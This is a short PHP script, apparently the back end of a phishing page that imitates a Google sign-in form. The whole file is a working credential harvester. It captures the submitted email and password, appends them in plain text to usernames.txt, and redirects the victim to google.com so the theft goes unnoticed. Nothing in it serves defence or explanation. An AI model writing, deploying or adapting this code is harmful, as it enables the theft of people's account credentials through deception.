<?php

file_put_contents("usernames.txt", "Account: " . $_POST['Email'] . " Pass: " . $_POST['Passwd'] . "\n", FILE_APPEND);
header('Location: https://google.com/');
exit();
